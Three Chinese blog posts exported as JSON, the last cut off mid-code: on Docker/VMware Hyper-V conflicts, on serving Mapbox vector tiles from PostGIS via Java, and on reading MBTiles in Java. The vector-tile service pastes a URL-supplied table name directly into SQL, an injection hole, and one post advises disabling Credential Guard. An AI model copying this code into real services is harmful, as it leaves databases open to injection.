[{"content":"前言 为什么需要理解虚拟机的网络机制呢？主要原因是我安装了windows的docker之后vmware里面的虚拟机打不开了\n一通操作把vmware的虚拟机打开了，但是虚拟机的网络又用不了了，所以有必要深入了解下虚拟机网络的相关知识\n何为 Hypervisor Hypervisor又称Virtual Machine Monitor（VMM）是用于创建和运行虚拟机（VM）的计算机软件，固件或硬件。承载Hypervisor和虚拟机的计算机称为宿主机（Host Machine），运行于宿主机上的虚拟机称为客户机（Guest Machine）。 Hypervisor为客体操作系统提供虚拟的作业平台并管理客体操作系统，使得不同操作系统的众多实例可以共享虚拟的硬件资源\n可以简单地理解为 Hypervisor 为虚拟机的运行提供了软件层面的基础\nHypervisor 通常分为两类, Type-1 和 Type-2\nType-1：直接运行在硬件层面上来管理虚拟机（例如Hyper-V） Type-2：像其他应用程序一样运行在常规的操作系统中，一个客户机作为一个进程运行在宿主机上（例如VMWare WorkStation） 冲突是什么 Docker 官方出品的 Windows 客户端，而其正常运行的条件之一是系统开启了 Hyper-V 虚拟化服务。\n由上文知 Hyper-V 是 Type-1 的 Hypervisor，这将使得像 VMware 等作为 Type-2 Hypervisor 的软件无法运行\n使用 Hyper-V 技术的 Docker 客户端与其他 Type-2 Hypervisor 不能同时运行， 必须重启并关闭 Hyper-V 才能再次运行其他的 Type-2 Hypervisor 软件\nvmware与docker配置 由于docker与vmware的不兼容，导致出现两个软件无法同时使用以及网络方面的问题\n所以在使用时只能二者选择其一，以下是使用两个软件时需要做的相关配置\n使用vmware 步骤一：禁用Device Guard或Credential Guard：\n1.禁用用于启用Credential Guard的组策略设置。\n在主机操作系统上，右键单击**“开始” \u0026gt; “运行”**，键入gpedit.msc，然后单击“ 确定”，打开本地组策略编辑器。 转至本地计算机策略 \u0026gt; 计算机配置 \u0026gt; 管理模板\u0026gt;系统 \u0026gt;Device Guard（或者是： 设备防护） \u0026gt; 启用基于虚拟化的安全性。 选择已禁用。 2.转到**“控制面板” \u0026gt;“ 卸载程序” \u0026gt;“ 打开或关闭Windows功能”**以关闭Hyper-V。\n3.选择不重启。\n步骤二：通过命令关闭Hyper-V（控制面板关闭Hyper-V起不到决定性作用，要彻底关闭Hyper-V）\n以管理员身份运行Windows Powershell (管理员)（Windows键+X）\n运行下面命令并重启电脑！\n1 bcdedit /set hypervisorlaunchtype off 使用docker Docker是基于Hyper-V服务的，Hyper-V主机服务的运行可以用命令开启关闭\n控制面板（可选）\nPowerShell的管理员模式\n对应的打开Hyper-V的命令：\n1 bcdedit /set hypervisorlaunchtype auto 重启电脑！\ndocker windows 安装\nWindows10 Docker安装详细教程\nWindows 10 - Docker\n为什么虚拟机连不上网络 参考\nVMware 虚拟机里连不上网的五种解决方案\nVMware虚拟机网络配置-NAT篇\n使用NAT模式会出现无法访问外网的情况，可能原因与校园网的配置有关，所以解决方法是使用==桥接模式==，就可以访问外网了\nVM桥接模式下 复制物理网络连接状态选项有什么作用？\n如果要虚拟机上网，勾不勾该选项，没什么区别。 如果不勾的话，无线和有线切换，很有可能IP地址发生变化，需要重新查看。 分割线——下面的方法理论上可行，但是我配置不成功 猜测的原因可能与vEthernet有关\nvEthernet是Win10系统在添加了Hyper-V虚拟机组件之后自动创建的虚拟网卡\n方法一：修改主机网络配置 1.找到自己现在连接的网络，右键→属性→共享→勾选允许其他网络连接→将虚拟机的NAT网络 VM8共享连接到该网络 保存\n==2.重新配置vmware的net网络==\n因为上一步把vmnet8的网络配置改了，所以要重新配置vmware的net网络\nVMware虚拟机网络配置-NAT篇\n方法二：禁用Hyper-V主机服务 控制面板\nPowerShell的管理员模式\n对应的打开Hyper-V的命令：\n1 bcdedit /set hypervisorlaunchtype auto 重启电脑！\n上述步骤操作完成之后vEthernet就删除了\n参考\nWindows 下 Docker 与 VMware 共存\nWin下Docker与VM虚拟机不兼容\n解决VM 与 Device/Credential Guard 不兼容。在禁用 Device/Credential Guard 后，可以运行 VM 的方法\n","permalink":"https://chance7bin.github.io/posts/note/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9Cvmwaredocker/","summary":"前言 为什么需要理解虚拟机的网络机制呢？主要原因是我安装了windows的docker之后vmware里面的虚拟机打不开了 一通操作把vmwar","title":"虚拟机网络——vmware\u0026docker"},{"content":"矢量瓦片 GIS中的矢量与栅格数据 矢量切片(Vector tile)\n在GIS中的数据分类有很多种方式，其中最常用的一种是根据数据组织结构方式的不同而分类成矢量数据和栅格数据的两种类型。\n其中栅格数据以二维矩阵的形式来表示地理空间信息的数据结构，其中数据的最小存在单元是以像素的形式存在，可以理解为和图片的组织结构类似，以分辨率等特征作为精度的定义标准。\n而矢量数据则是试图利用点、线、面等几何要素来表现这个世界，其数据结构紧凑精准，数据图形质量好，有利于地理信息检索与网络传输等。其中矢量数据的最小单元是以点的形式存在，点构成线，线组成面，面构造出体。所以，我个人看来矢量数据应该更贴近于信息的精准分析与计算，而栅格数据则偏重于信息的表达（主要受制于当前图像处理技术的瓶颈）。\n栅格数据\r矢量数据数据\r为了带来更好更快的用户体验，目前许多主流WebGIS应用都采用了栅格切片技术，通过缓存切片的形式使得地图数据的浏览体验更顺畅。打开浏览器，F12出控制台，进入任意一家地图供应商提供的地图应用，你会发现大部分的地图数据都是以切片的形式请求获得的。栅格地图的切片应用是很广泛，可在我们的日常工作中遇到的需求往往要比这些功能需求较浅的商业性地图复杂，有的时候用户甚至会提出需要地图配色的编辑修改功能这样的需求，这是商业主流地图所达不到的，因为栅格切片在完成切图之后，所能控制的最小单位是一张图片，失去了对图片上地理信息的交互能力。\n总结来看，栅格切片存在以下的几个缺点：\n地图数据一次渲染，无法修改 无交互能力 那可否用WFS来替代呢？直接用WFS请求获取矢量数据，这样不就获得了交互能力吗？当然，如果在你的应用中矢量数据量不大的情况下，这样做也是可行的，但是一旦数据量大了起来，前端对于数据的请求和响应处理渲染会提高客户端的硬件门槛，而频繁的交互操作也会对服务器产生压力。\n直接加载的矢量数据与对栅格地图进行切片这两种方式看起来好像有些互补，如果能将这二者结合起来的话应该会很美好： 矢量+切片=矢量切片。\n什么是矢量切片？ 和栅格切片一样的思路，以金字塔的方式切割矢量数据，只不过切割的不是栅格图片，而是矢量数据的描述性文件，目前矢量切片主要有以下三种格式：GeoJSON，TopoJSON和MapbBox Vector Tile(MVT)。\n栅格切图后文件存储形式 ：\n矢量切图后文件存储形式：\n切片中的数据结构：\n从上面的两张图可以看出，其实思路是一致的，因此，矢量切图结合了矢量数据与栅格切图的优势互补：\n前端缓存切片，提高地图使用的体验 粒度上来看，矢量切图继承了矢量数据的特性，以要素为单位进行管理，加强了细节上的把控能力 在保证体验的前提下，为用户提供地图数据样式动态修改的功能，加强了地图定制化的程度 数据的实时性 如何生成矢量切片？ 矢量切片生成方式共有以下几种：\n1）ArcGIS 系列产品：利用ArcGIS Pro生成矢量切片，然后发布在ArcGIS Online上；\n2）Mapbox，目前已经提出了一套开放的矢量切片标准，并被多个开源团队所接受；\n3）GeoServer，在2.11beta版中出现了对矢量切片的支持，主要依赖于开源插件geoserver-2.11-SNAPSHOT-vectortiles-plugin以及内嵌的GeoWebcahce完成切片工作。\n==本文采取Mapbox的方式==\nMapbox的矢量瓦片 MVT简介 Mapbox的矢量瓦片（mapbox vector tile）是一种轻量级的数据格式，用于存储地理空间矢量数据，例如点、线和多边形。\n矢量瓦片以 Google Protobufs（PBF）进行编码，这允许对结构化数据进行序列化。\nMapbox矢量瓦片使用的是.mvt的文件后缀。\nMapbox矢量瓦片标准 Mapbox矢量瓦片标准\nVector tiles standards\n几何编码 Encoding geometry\n几何编码将点、线和多边形编码为相对于网格左上角的x/y坐标对，如下图所示\nMoveTo：起点\nLineTo：画线\nClosePath：闭环\n属性编码 Encoding attributes\n属性编码是采用键值对的方式，压缩重复的属性值，将属性的键值对与矢量瓦片的键值对一一对应\n有了矢量瓦片标准，对于在Web里面来说，利用WebGL的moveTo/lineTo之类的API，可以将矢量瓦片绘制出来。\n使用PostGIS生成mvt WebMecator投影瓦片计算规则 在生成mvt前，需要先了解一下瓦片的计算规则\n参考链接：\nhttps://zhuanlan.zhihu.com/p/548171000\nhttps://www.cnblogs.com/beniao/archive/2010/04/18/1714544.html\n墨卡托投影（Mercator Projection），又名“等角正轴圆柱投影”，荷兰地图学家墨卡托（Mercator）在1569年拟定，假设地球被围在一个中空的圆柱里，其赤道与圆柱相接触，然后再假想地球中心有一盏灯，把球面上的图形投影到圆柱体上，再把圆柱体展开，这就是一幅标准纬线为零度（即赤道）的“墨卡托投影”绘制出的世界地图。\n由于赤道半径为6378137米，则赤道周长为2 * PI * r = 40075016.685578486162，因此X轴的取值范围：[-20037508.3427892,20037508.3427892]。当纬度φ接近两极，即90°时，Y值趋向于无穷。因此通常把Y轴的取值范围也限定在[-20037508.3427892,20037508.3427892]之间。因此在墨卡托投影坐标系（米）下的坐标范围是：最小为(-20037508.3427892, -20037508.3427892 )到最大坐标为(20037508.3427892, 20037508.3427892)。\n基础值\n1 2 3 4 地球半径：EARTH_RADIUS = 6378137; X和Y的最大值： worldMercMax = π*EARTH_RADIUS = 20037508.3427892 X和Y的最小值： worldMercMin = -1 * worldMercMax 地球赤道周长： worldMercSize = worldMercMax - worldMercMin= 2 * π * EARTH_RADIUS = 40075016.68557848616 谷歌的瓦片地图规范已经实行多年，并深受认可，Bing、OSM、高德、天地图等都使用谷歌的瓦片地图规范，谷歌瓦片地图规范坐标原点为东经180°，北纬85.05°，==x轴向右，y轴向下==。\n瓦片被切成256*256像素的图片，在不同的zoom等级，\nt瓦片数量为： $2^{level}$\n例如，zoom level为3时，横轴和纵轴方向瓦片数量均为8，瓦片对应坐标如下图所示。\n生成mvt的ST函数 参考链接：\nhttps://www.jianshu.com/p/e15ca286546c\nhttps://blog.csdn.net/qq_35241223/article/details/106439268\n主要函数：\nST_AsMvtGeom 用于将一个图层中位于参数box2d范围内的一个几何图形的所有坐标转换为MapBox Vector Tile坐标空间里的坐标。\nST_AsMVT 用于将基于MapBox Vector Tile坐标空间的几何图形转换为MapBox VectorTile二进制矢量切片\nST_TileEnvelope（3.0以上支持） 根据行列号获取Envelope\n辅助函数：\nST_Transform 坐标转换函数，用它可以做到支持任何坐标系的矢量瓦片\nST_Simplify 简化，用它来做线或者面的简化\nST_SimplifyPreserveTopology 与简化类似\nST_AsMvtGeom 应该将geom转到墨卡托坐标下，4326坐标下制作矢量瓦片有横向的压扁\nST_AsMVT 用于将基于MapBox Vector Tile坐标空间的几何图形转换为MapBox VectorTile二进制矢量切片\nrow —— 至少具有一个geometry列的行数据。 name —— 图层名字，默认为\u0026quot;default\u0026quot;。 extent —— 由MVT规范定义的屏幕空间（MVT坐标空间）中的矢量切片范围。 geom_name —— row参数的行数据中geometry列的列名，默认是第一个*geometry类型的列。 feature_id_name —— 行数据中要素ID列的列名。如果未指定或为NULL，则第一个有效数据类型（smallint, integer, bigint）的列将作为要素ID列，其他的列作为要素属性列。 ST_AsMVTGeom 用于将一个图层中位于参数box2d范围内的一个几何图形的所有坐标转换为MapBox Vector Tile坐标空间里的坐标。\ngeom —— 被转换的几何图形信息。 bounds—— 某个矢量切片的范围对应的空间参考坐标系中的几何矩形框（没有缓冲区）。 extent—— 是按规范定义的矢量切片坐标空间中的某个矢量切片的范围。如果为NULL，则默认为4096（边长为4096个单位的正方形）。 buffer—— 矢量坐标空间中缓冲区的距离，位于该缓冲区的几何图形部位根据clip_geom参数被裁剪或保留。如果为NULL，则默认为256。 clip_geom—— 用于选择位于缓冲区的几何图形部位是被裁剪还是原样保留。如果为NULL，则默认为true。 PostGIS生成MVT矢量切片的步骤 使用ST_AsMVTGeom函数将几何图形的所有坐标转换为MapBox Vector Tile坐标空间里的坐标，这样就将基于空间坐标系的几何图形转换成了基于MVT坐标空间的几何图形。 使用ST_AsMVT函数将基于MVT坐标空间的几何图形转换为MVT二进制矢量切片。 可以通过\u0026quot;||\u0026ldquo;操作符调用多次这个函数来同时创建多个图层的同一位置的矢量切片。\nPostGIS ST函数 1 2 3 4 5 6 7 8 9 10 11 WITH bounds AS ( SELECT ST_Segmentize(ST_MakeEnvelope(13071343.332991, 3678761.297309, 13149614.849955, 3757032.814273, 3857),19567.879241) AS geom, ST_Segmentize(ST_MakeEnvelope(13071343.332991, 3678761.297309, 13149614.849955, 3757032.814273, 3857),19567.879241)::box2d AS b2d ), mvtgeom AS ( SELECT ST_AsMVTGeom(ST_Transform(t.geom, 3857), bounds.b2d) AS geom, * FROM js_city_point_u_6492c1048429434b637f1be5 t, bounds WHERE ST_Intersects(t.geom, ST_Transform(bounds.geom, 4326)) ) SELECT ST_AsMVT(mvtgeom.* , \u0026#39;js_city_point_u_6492c1048429434b637f1be5\u0026#39; ) FROM mvtgeom 这段 PostGIS SQL 语句就是用于生成 MVT（Mapbox Vector Tiles）数据。\n让我们逐步解释这段 SQL 语句的意思：\n首先，使用 WITH 子句创建一个名为 bounds 的临时表，其中包含一个几何对象和一个边界框（box2d）。这个几何对象是通过使用 ST_MakeEnvelope 函数创建的，该函数根据提供的坐标范围**（tileToEnvelope函数计算得到）**和坐标系生成一个矩形。然后，使用 ST_Segmentize 函数对几何对象进行分段，以确保生成的矢量瓦片在显示时具有一定的细节和精度。\n接下来，使用 mvtgeom 作为名称创建另一个临时表。在这个临时表中，使用 ST_Transform 函数将 t.geom（js_city_point_u_6492c1048429434b637f1be5 表中的几何列）从源坐标系（4326）转换为目标坐标系（3857）。然后，使用 ST_AsMVTGeom 函数将转换后的几何对象与 bounds.b2d 边界框进行相交（使用 ST_Intersects 函数），从而获得符合条件的几何对象。在结果中，还包含原始表 t 的所有列。\n最后，使用 SELECT 语句从 mvtgeom 表中选择几何对象，并使用 ST_AsMVT 函数将这些几何对象转换为 MVT 格式的瓦片。'js_city_point_u_6492c1048429434b637f1be5' 是指定瓦片的图层名称。\n简而言之，这个 SQL 查询的目的是生成包含符合条件的几何对象的 MVT 瓦片数据。它利用了 PostGIS 的空间函数和转换功能来处理几何对象的坐标系转换和分段，然后将结果转换为 MVT 格式的瓦片数据。\nST_MakeEnvelope需要的范围是如何确定的呢？\n有了前面瓦片的计算规则的基础，就不难理解所求瓦片的x/y最大值最小值范围的计算方法了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 HashMap\u0026lt;String, Double\u0026gt; tileToEnvelope(int zoom, int x, int y) { double worldMercMax = 20037508.3427892; double worldMercMin = -1 * worldMercMax; double worldMercSize = worldMercMax - worldMercMin; double worldTileSize = Math.pow(2, zoom); double tileMercSize = worldMercSize / worldTileSize; HashMap\u0026lt;String, Double\u0026gt; env = new HashMap\u0026lt;String, Double\u0026gt;(); env.put(\u0026#34;xmin\u0026#34;, worldMercMin + tileMercSize * x); env.put(\u0026#34;xmax\u0026#34;, worldMercMin + tileMercSize * (x + 1)); env.put(\u0026#34;ymin\u0026#34;, worldMercMax - tileMercSize * (y + 1)); env.put(\u0026#34;ymax\u0026#34;, worldMercMax - tileMercSize * y); return env; } Java代码实现 接口返回的数据是==MVT二进制矢量切片==\nController 1 2 3 4 5 6 7 8 9 @GetMapping(value = \u0026#34;/mvt/{tableName}/{zoom}/{x}/{y}.pbf\u0026#34;) public void getMvt(@PathVariable(\u0026#34;tableName\u0026#34;) String tableName, @PathVariable(\u0026#34;zoom\u0026#34;) int zoom, @PathVariable(\u0026#34;x\u0026#34;) int x, @PathVariable(\u0026#34;y\u0026#34;) int y, HttpServletResponse response) { pgService.getMvt(zoom, x, y, tableName, response); } Service 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 public void getMvt(int zoom, int x, int y, String tableName, HttpServletResponse response) { try { String sql = getMvtSql(zoom, x, y, tableName); if (sql == null) { return; } log.info(\u0026#34;DefaultPgSource: \u0026#34; + zoom + \u0026#34;, \u0026#34; + x + \u0026#34;, \u0026#34; + y + \u0026#34;:\u0026#34; + sql); byte[] mvtByte = mvtRepository.getMvtFromDefaultPg(sql); returnMvtByte(mvtByte, zoom, x, y, response); } catch (Exception e) { log.error(e.getMessage()); } } public String getMvtSql(int zoom, int x, int y, String tableName) { if (!MvtUtils.tileIsValid(zoom, x, y)) { return null; } HashMap\u0026lt;String, Double\u0026gt; envelope = MvtUtils.tileToEnvelope(zoom, x, y); String sql = MvtUtils.envelopeToSQL(envelope, tableName); return sql; } public void returnMvtByte(byte[] mvtByte, int zoom, int x, int y, HttpServletResponse response) throws IOException { response.setHeader(\u0026#34;Access-Control-Allow-Origin\u0026#34;, \u0026#34;*\u0026#34;); response.setHeader(\u0026#34;Content-type\u0026#34;, \u0026#34;application/vnd.mapbox-vector-tile\u0026#34;); String mtvFileName = String.format(\u0026#34;%d_%d_%d.mvt\u0026#34;, zoom, x, y); response.setHeader(\u0026#34;Content-Disposition\u0026#34;, \u0026#34;attachment;filename=\u0026#34; + new String(mtvFileName.getBytes(\u0026#34;UTF-8\u0026#34;), \u0026#34;iso-8859-1\u0026#34;)); OutputStream os = response.getOutputStream(); os.write(mvtByte); } Repository 1 2 3 4 5 6 7 8 9 public byte[] getMvtFromDefaultPg(String sql) { try { byte[] reByte = jdbcTemplate.queryForObject(sql, (rs, rowNum) -\u0026gt; rs.getBytes(\u0026#34;st_asmvt\u0026#34;)); return reByte; } catch (Exception e) { log.error(\u0026#34;默认数据库瓦片获取失败\u0026#34; + e.getMessage()); return null; } } MVT工具类 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 public class MvtUtils { public static Boolean tileIsValid(int zoom, int x, int y) { Double size = Math.pow(2, zoom); if (x \u0026gt;= size || y \u0026gt;= size) { return false; } if (x \u0026lt; 0 || y \u0026lt; 0) { return false; } return true; } public static HashMap\u0026lt;String, Double\u0026gt; tileToEnvelope(int zoom, int x, int y) { double worldMercMax = 20037508.3427892; double worldMercMin = -1 * worldMercMax; double worldMercSize = worldMercMax - worldMercMin; double worldTileSize = Math.pow(2, zoom); double tileMercSize = worldMercSize / worldTileSize; HashMap\u0026lt;String, Double\u0026gt; env = new HashMap\u0026lt;String, Double\u0026gt;(); env.put(\u0026#34;xmin\u0026#34;, worldMercMin + tileMercSize * x); env.put(\u0026#34;xmax\u0026#34;, worldMercMin + tileMercSize * (x + 1)); env.put(\u0026#34;ymin\u0026#34;, worldMercMax - tileMercSize * (y + 1)); env.put(\u0026#34;ymax\u0026#34;, worldMercMax - tileMercSize * y); return env; } public static String envelopeToBoundsSQL(HashMap\u0026lt;String, Double\u0026gt; env) { int DENSIFY_FACTOR = 4; env.put(\u0026#34;segSize\u0026#34;, (env.get(\u0026#34;xmax\u0026#34;) - env.get(\u0026#34;xmin\u0026#34;)) / DENSIFY_FACTOR); String sqlTemp = String.format(\u0026#34;ST_Segmentize(ST_MakeEnvelope(%f, %f, %f, %f, 3857),%f)\u0026#34;, env.get(\u0026#34;xmin\u0026#34;), env.get(\u0026#34;ymin\u0026#34;), env.get(\u0026#34;xmax\u0026#34;), env.get(\u0026#34;ymax\u0026#34;), env.get(\u0026#34;segSize\u0026#34;)); return sqlTemp; } public static String envelopeToSQL(HashMap\u0026lt;String, Double\u0026gt; env, String tableName) { // lines_pg gis_osm_transport_free_1 HashMap\u0026lt;String, String\u0026gt; table = new HashMap\u0026lt;String, String\u0026gt;(); table.put(\u0026#34;table\u0026#34;, tableName); table.put(\u0026#34;srid\u0026#34;, \u0026#34;4326\u0026#34;); table.put(\u0026#34;geomColumn\u0026#34;, \u0026#34;geom\u0026#34;); table.put(\u0026#34;attrColumns\u0026#34;, \u0026#34; * \u0026#34;); table.put(\u0026#34;env\u0026#34;, envelopeToBoundsSQL(env)); String mvtsql = MessageFormat.format(\u0026#34;WITH\u0026#34; + \u0026#34; bounds AS ( SELECT {0} AS geom, {0}::box2d AS b2d),\u0026#34; + \u0026#34; mvtgeom AS (\u0026#34; + \u0026#34; SELECT ST_AsMVTGeom(ST_Transform(t.{1}, 3857), bounds.b2d) AS geom, {2}\u0026#34; + \u0026#34; FROM {3} t, bounds\u0026#34; + \u0026#34; WHERE ST_Intersects(t.{1}, ST_Transform(bounds.geom, {4}))\u0026#34; + \u0026#34; )\u0026#34; + \u0026#34; SELECT ST_AsMVT(mvtgeom.* , \u0026#39;\u0026#39;{3}\u0026#39;\u0026#39; ) FROM mvtgeom\u0026#34;, table.get(\u0026#34;env\u0026#34;), table.get(\u0026#34;geomColumn\u0026#34;), table.get(\u0026#34;attrColumns\u0026#34;), table.get(\u0026#34;table\u0026#34;), table.get(\u0026#34;srid\u0026#34;)); return mvtsql; } } ","permalink":"https://chance7bin.github.io/posts/map/mapbox-vector-tile-%E8%AF%A6%E8%A7%A3/","summary":"矢量瓦片 GIS中的矢量与栅格数据 矢量切片(Vector tile) 在GIS中的数据分类有很多种方式，其中最常用的一种是根据数据组织结构方式的不同而分类","title":"mapbox vector tile 详解"},{"content":"1.mbtiles简介 mapbox Docs : MBTiles\nMbTiles 是一种用于在 sqllite 数据库中存储任意瓦片地图数据用于即时使用和高效传输的规范。\nMBTiles瓦片存储规范的制定主要是为了解决、优化传统瓦片的存储方案存在的两个问题：\n可移植性差，无法在移动端上做离线应用 存储量大，大家都知道，因为互联网上的地图都以“瓦片”的形式存在，高层级的瓦片存储数量往往是海量的。例如，对于“Web 墨卡托”投影的瓦片金字塔来说，第15层数据有 4^15 = 1073741824个瓦片。 参见文档，Mbtiles其实本质是一个SQLite3文件，大家知道，SQLite有它天然的可移植特性（整个数据库就是一个sqlite3文件，当然可移植性够好）。这个解决了1的问题。\n下面简单解读一下规范，该规范描述了这个sqlite3文件的表必须符合以下规定：\n必须要一个名叫“metadata”的table（表）或者view（视图），这个表其实就是“元数据”表，用来描述存储的数据。这个表必须要有两列，一列是\u0026quot;name\u0026quot;，一列是“value”，这两列都是text类型的。这个表必须包含一些特定的row,例如name=\u0026ldquo;name\u0026rdquo;,value=\u0026ldquo;数据集名称\u0026rdquo;；name: \u0026ldquo;format\u0026rdquo; ,value: \u0026ldquo;pbf\u0026quot;代表存储的瓦片格式；name: \u0026ldquo;center\u0026rdquo; ,value: -122.1906,37.7599,1代表这个数据集存储的数据中心在这个经纬度处。对于Mapbox矢量瓦片集，有特殊的json字段，用来描述矢量瓦片集。\n必须要有一个名字叫“tiles”的表。建表语句\nCREATE TABLE tiles (zoom_level integer, tile_column integer, tile_row integer, tile_data blob);\n它可能会有一个索引：\nCREATE UNIQUE INDEX tile_index on tiles (zoom_level, tile_column, tile_row);\n这个表主要存了x/y/z和对应的瓦片数据（BLOB)\n2.金字塔模型 要了解mbtiles是怎么存储的，首先需要先了解瓦片地图的金字塔模型\n众所周知，对于Web而言，将矢量图层渲染为栅格数据是一个昂贵的计算过程。对于不经常修改的矢量图层，重复描绘同样线条会极大浪费CPU资源。继Google Maps推出瓦片地图后，各大地图网站都转而采取预先渲染标注好的海量图片并分割为256*256像素瓦片的策略，从而使得浏览器能快速地缓存小尺寸且不会更名的瓦片。\n瓦片地图是一个三维的概念，即金字塔模型，其每增大一级，会在上一级瓦片的基础上一分为四，随着分辨率的提升，显示的内容也渐显丰富。通常使用xyz三维坐标系来对一张瓦片进行精准定位，其中z用于表示地图的层级，xy表示某个层级内的瓦片平面。该瓦片平面可被视为数学上常见的笛卡尔坐标系，只要确定了横轴坐标x和纵轴坐标y，便可以唯一确定在这个瓦片平面上的每一个瓦片，如图所示。\n3.mbtiles结构 示例数据2017-07-03_planet_z0_z14.mbtiles，下载地址：https://data.maptiler.com/downloads/tileset/osm/\nmbtiles中几个比较重要的表：\nmap：存储层级以及行列号**（金字塔模型**），以及瓦片id images：存储瓦片id以及对应的图片数据 metadata：存取地图的元数据信息 3.1 metadata表 3.2 tiles视图 视图构建SQL：\n1 2 3 4 5 6 7 SELECT map.zoom_level AS zoom_level, map.tile_column AS tile_column, map.tile_row AS tile_row, images.tile_data AS tile_data FROM map JOIN images ON images.tile_id = map.tile_id 通过sql语句我们可以知道tiles视图其实就是把map表里面的瓦片层级信息与images表的瓦片图片数据关联起来\n视图基本结构：\n4.Java加载Mbtiles发布地图服务 示例数据2017-07-03_planet_z0_z14.mbtiles，下载地址：https://data.maptiler.com/downloads/tileset/osm/\n4.1 加载mbtiles 加载sqlite驱动\n1 2 3 4 5 6 \u0026lt;!-- sqlite驱动 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.xerial\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sqlite-jdbc\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.34.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 连接数据库\n1 2 3 4 5 6 7 8 9 10 11 try { Class.forName(\u0026#34;org.sqlite.JDBC\u0026#34;); } catch (ClassNotFoundException e) { // e.printStackTrace(); log.warn(\u0026#34;Database driver not found!\u0026#34;); } // 得到连接 会在你所填写的文件夹建一个你命名的文件数据库 Connection conn; // String conurl = \u0026#34;jdbc:sqlite:E:/mapArchiveFiles/tianditu/img_c.mbtiles\u0026#34;; conn = DriverManager.getConnection(conurl,null,null); 封装为bean\n地图服务的接口每次都需请求上百张图片，如果每次请求都重新连接数据库会导致程序崩溃，所以需将其封装为bean，暴露出连接mbtiles的Connection，这样只需项目启动时连接一次数据库即可\n注意：连接数据库 返回连接数据库的Connection 不能返回执行SQL语句的statement，因为每个Statement对象只能同时打开一个ResultSet对象，高并发情况下会出现 rs.isOpen() on exec 的错误\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 @Slf4j @Configuration public class SqliteConfig { @Bean(name = \u0026#34;mbtilesConnection\u0026#34;) Connection mbtilesConnection() throws SQLException { String path = \u0026#34;Z:/2017-07-03_planet_z0_z14.mbtiles\u0026#34;; // mbtiles路径 return getConnection(\u0026#34;jdbc:sqlite:\u0026#34; + path); } public static Connection getConnection(String conurl) throws SQLException { try { Class.forName(\u0026#34;org.sqlite.JDBC\u0026#34;); } catch (ClassNotFoundException e) { // e.printStackTrace(); log.warn(\u0026#34;Database driver not found!\u0026#34;); } // 得到连接 会在你所填写的文件夹建一个你命名的文件数据库 Connection conn; // String conurl = \u0026#34;jdbc:sqlite:E:/mapArchiveFiles/tianditu/img_c.mbtiles\u0026#34;; conn = DriverManager.getConnection(conurl,null,null); // 设置自己主动提交为false conn.setAutoCommit(false); //推断表是否存在 ResultSet rsTables = conn.getMetaData().getTables(null, null, \u0026#34;tiles\u0026#34;, null); if(!rsTables.next()){ log.warn(\u0026#34;{} does not exist!\u0026#34;, conurl); } else { log.info(\u0026#34;{} successfully connected!\u0026#34;, conurl); } return conn; // return conn.createStatement(); } } 4.2 查询mbtiles 根据请求的层级z以及行列号x、y到数据库的tiles表查找对应的瓦片数据\n**注意：**由于mapbox只能加载未压缩的pbf格式数据，直使用tippecanoe生成的pbf是经过gzip压缩的数据，不执行解压缩，mapbox加载数据会报：“Unimplemented type: 3” 错误，所以必须对得到的tile_data解压缩：FileUtils.gzipUncompress(imgByte)\n是否需要解压缩要根据生成mbtiles时对瓦片采取的操作而定，例如使用mbutil工具实现地图切片向mbtiles文件格式的转换，其生成mbtiles时图片并没有经过压缩，所以在获取到tile_data时就不需要解压缩，如下是mbutil生成mbtiles时的部分代码片段，可以看到mbutil只是对图片二进制处理，并没有压缩\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 private void queryMbtilesWithUncompress( TilesDTO tilesDTO, Connection connection, HttpServletResponse response){ try { Statement statement = connection.createStatement(); // 得到结果集 String sql = \u0026#34;SELECT * FROM tiles WHERE zoom_level = \u0026#34;+ tilesDTO.getZoom_level() + \u0026#34; AND tile_column = \u0026#34;+ tilesDTO.getTile_column() + \u0026#34; AND tile_row = \u0026#34;+ tilesDTO.getTile_row() ; ResultSet rs = statement.executeQuery(sql); if(rs.next()) { byte[] imgByte = (byte[]) rs.getObject(\u0026#34;tile_data\u0026#34;); // 解压缩 byte[] bytes = FileUtils.gzipUncompress(imgByte); InputStream is = new ByteArrayInputStream(bytes); OutputStream os = response.getOutputStream(); try { int count = 0; byte[] buffer = new byte[1024 * 1024]; while ((count = is.read(buffer)) != -1) { os.write(buffer, 0, count); } os.flush(); } catch (IOException e) { // e.printStackTrace(); } finally { os.close(); is.close(); } } else{ log.debug(\u0026#34;sql: {}\u0026#34;,sql); log.debug(\u0026#34;未找到瓦片!\u0026#34;); } rs.close(); //statement在每次执行之后都要关了 statement.close(); }catch (Exception e){ // e.printStackTrace(); } } GZIP解压\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 //GZIP解压 public static byte[] gzipUncompress(byte[] bytes) { if (bytes == null || bytes.length == 0) { return null; } ByteArrayOutputStream out = new ByteArrayOutputStream(); ByteArrayInputStream in = new ByteArrayInputStream(bytes); try { GZIPInputStream ungzip = new GZIPInputStream(in); byte[] buffer = new byte[256]; int n; while ((n = ungzip.read(buffer)) \u0026gt;= 0) { out.write(buffer, 0, n); } } catch (IOException e) { log.error(\u0026#34;gzip uncompress error.\u0026#34;, e); } return out.toByteArray(); } 4.3 接口编写 controller层\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 @ApiOperation(value = \u0026#34;得到mapbox瓦片\u0026#34; ) @GetMapping(\u0026#34;/mapbox/{z}/{x}/{y}.pbf\u0026#34;) public void getMapboxTiles( @ApiParam(name = \u0026#34;z\u0026#34;, value = \u0026#34;zoom_level\u0026#34;) 